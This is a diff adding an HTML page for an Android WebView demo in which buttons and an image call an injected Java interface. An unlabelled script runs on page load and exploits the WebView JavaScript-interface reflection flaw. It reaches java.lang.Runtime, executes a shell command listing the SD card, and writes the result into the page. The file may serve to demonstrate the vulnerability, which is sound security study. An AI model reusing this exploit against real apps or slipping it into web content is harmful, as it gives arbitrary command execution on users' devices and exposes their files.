@@ -1,0 +1,68 @@
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <script>
+      var i=0;
+      function getContents(inputStream)
+      {
+        var contents = ""+i;
+        var b = inputStream.read();
+        var i = 1;
+        while(b != -1) {
+            var bString = String.fromCharCode(b);
+            contents += bString;
+            contents += "\n"
+            b = inputStream.read();
+        }
+        i=i+1;
+        return contents;
+       }
+      
+       function execute(cmdArgs)
+       {
+        for (var obj in window) {
+            console.log(window[obj]);
+            if ("getClass" in window[obj]) {
+                alert(obj);
+                return window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+             }
+         }
+       } 
+      
+      var p = execute(["ls","/mnt/sdcard/"]);
+      document.write(getContents(p.getInputStream()));
+    </script>
+
+    <script language="javascript">
+      function onButtonClick() 
+      {
+        // Call the method of injected object from Android source.
+        var text = jsInterface.onButtonClick("从JS中传递过来的文本！！！");
+        alert(text);
+      }
+
+      function onImageClick() 
+      {
+        //Call the method of injected object from Android source.
+        var src = document.getElementById("image").src;
+        var width = document.getElementById("image").width;
+        var height = document.getElementById("image").height;
+
+        // Call the method of injected object from Android source.
+        jsInterface.onImageClick(src, width, height);
+      }
+    </script>
+  </head>
+
+  <body>
+      <p>点击图片把URL传到Java代码</p>
+      <img class="curved_box" id="image" 
+         onclick="onImageClick()"
+         width="328"
+         height="185"
+         src="http://t1.baidu.com/it/u=824022904,2596326488&fm=21&gp=0.jpg"
+         onerror="this.src='background_chl.jpg'"/>
+    </p>
+    <button type="button" onclick="onButtonClick()">与Java代码交互</button>
+  </body>
+</html>
